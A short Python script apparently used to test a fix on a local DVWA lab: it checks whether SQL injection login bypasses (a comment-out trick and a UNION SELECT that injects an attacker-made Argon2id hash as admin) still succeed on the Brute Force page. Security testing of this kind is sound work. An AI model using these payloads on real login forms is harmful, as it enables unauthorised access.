#!/usr/bin/env python3
"""Brute Force lab (Low) after R2: which SQL injection tricks still work?"""
import sys
sys.path.insert(0, __file__.rsplit('/', 1)[0])
from dvwa_client import DVWA
d = DVWA("https://127.0.0.1", "certs/lab-ca.crt"); d.reset_db(); d.login("admin", "password"); d.set_security("low")
def t(name, user, pw):
    r = d.s.get(d.url("vulnerabilities/brute/"), params={"username": user, "password": pw, "Login": "Login"})
    print(f"{name:55s} -> {'LOGGED IN' if 'Welcome to the password protected area' in r.text else 'rejected'}")
t("normal: admin / password", "admin", "password")
t("comment-out bypass: admin' -- / anything", "admin' -- ", "anything")
t("UNION injecting an attacker-made Argon2id hash of 'x'", "nobody' UNION SELECT 1,'a','b','admin','$argon2id$v=19$m=65536,t=4,p=1$NUxJUDkuMXYvMW13ajZBMQ$EVudcl5IwilULU7j4pcO6hOQW7FA8EJJQh3yaIq6wBg','x.jpg',NOW(),0,'user',1 -- ", "x")
